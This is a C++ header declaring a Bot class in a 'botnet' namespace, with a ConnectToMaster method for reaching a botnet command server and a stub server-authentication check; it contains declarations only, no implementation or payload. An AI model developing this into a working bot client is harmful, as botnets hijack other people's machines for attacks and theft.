#ifndef BOT_H
#define BOT_H

#include "../Socket/TCPSocket.h"

namespace botnet {

class Bot {
public:
	Bot();
	~Bot();

	/**
	* Connect to running Botnet server.
	* host - IP address or DNS name. e.g. "192.168.1.2" or "botnetServer.net".
	* port - Server port, as string.
	* Return value: returns if managed to successfuly connect to the server.
	*/
	bool ConnectToMaster(const std::string& host, const std::string& port);

private:
	tcpSocket server_connection;

	/**
	* Checks if server connected to is really 
	*/
	bool AuthenticateServer();

};

}

#endif